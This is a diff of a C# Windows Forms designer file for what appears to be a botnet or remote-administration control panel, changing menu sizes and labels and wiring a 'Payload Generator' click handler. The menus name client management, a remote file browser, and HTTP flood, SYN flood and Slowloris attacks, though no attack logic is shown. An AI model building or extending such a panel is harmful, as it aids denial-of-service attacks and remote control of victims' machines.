@@ -70,7 +70,6 @@
             this.addToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.pingClientsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.generatePayloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.pHPNativeAnonToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.getMyIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.attackToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.hTTPFloodToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -423,33 +422,26 @@
             // addToolStripMenuItem
             // 
             this.addToolStripMenuItem.Name = "addToolStripMenuItem";
-            this.addToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
+            this.addToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
             this.addToolStripMenuItem.Text = "Add Client";
             // 
             // pingClientsToolStripMenuItem
             // 
             this.pingClientsToolStripMenuItem.Name = "pingClientsToolStripMenuItem";
-            this.pingClientsToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
-            this.pingClientsToolStripMenuItem.Text = "Ping Clients";
+            this.pingClientsToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
+            this.pingClientsToolStripMenuItem.Text = "Ping All Clients";
             // 
             // generatePayloadToolStripMenuItem
             // 
-            this.generatePayloadToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.pHPNativeAnonToolStripMenuItem});
             this.generatePayloadToolStripMenuItem.Name = "generatePayloadToolStripMenuItem";
-            this.generatePayloadToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
-            this.generatePayloadToolStripMenuItem.Text = "Generate Payload";
-            // 
-            // pHPNativeAnonToolStripMenuItem
-            // 
-            this.pHPNativeAnonToolStripMenuItem.Name = "pHPNativeAnonToolStripMenuItem";
-            this.pHPNativeAnonToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
-            this.pHPNativeAnonToolStripMenuItem.Text = "PHP Native Anon";
+            this.generatePayloadToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
+            this.generatePayloadToolStripMenuItem.Text = "Payload Generator";
+            this.generatePayloadToolStripMenuItem.Click += new System.EventHandler(this.generatePayloadToolStripMenuItem_Click);
             // 
             // getMyIPToolStripMenuItem
             // 
             this.getMyIPToolStripMenuItem.Name = "getMyIPToolStripMenuItem";
-            this.getMyIPToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
+            this.getMyIPToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
             this.getMyIPToolStripMenuItem.Text = "Get My IP";
             this.getMyIPToolStripMenuItem.Click += new System.EventHandler(this.getMyIPToolStripMenuItem_Click);
             // 
@@ -465,13 +457,13 @@
             // hTTPFloodToolStripMenuItem
             // 
             this.hTTPFloodToolStripMenuItem.Name = "hTTPFloodToolStripMenuItem";
-            this.hTTPFloodToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
+            this.hTTPFloodToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.hTTPFloodToolStripMenuItem.Text = "HTTP Flood";
             // 
             // sYNFloodToolStripMenuItem
             // 
             this.sYNFloodToolStripMenuItem.Name = "sYNFloodToolStripMenuItem";
-            this.sYNFloodToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
+            this.sYNFloodToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.sYNFloodToolStripMenuItem.Text = "SYN Flood";
             // 
             // tabControl1
@@ -687,7 +679,7 @@
             this.tabPageFiles.Location = new System.Drawing.Point(4, 22);
             this.tabPageFiles.Name = "tabPageFiles";
             this.tabPageFiles.Padding = new System.Windows.Forms.Padding(3);
-            this.tabPageFiles.Size = new System.Drawing.Size(486, 396);
+            this.tabPageFiles.Size = new System.Drawing.Size(476, 405);
             this.tabPageFiles.TabIndex = 1;
             this.tabPageFiles.Text = "File Browser";
             this.tabPageFiles.UseVisualStyleBackColor = true;
@@ -875,7 +867,6 @@
         private System.Windows.Forms.ToolStripMenuItem sYNFloodToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem pingToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem generatePayloadToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem pHPNativeAnonToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem hTTPFloodToolStripMenuItem1;
         private System.Windows.Forms.ToolStripMenuItem sYNFloodToolStripMenuItem1;
         private System.Windows.Forms.ToolStripMenuItem slolorisToolStripMenuItem;
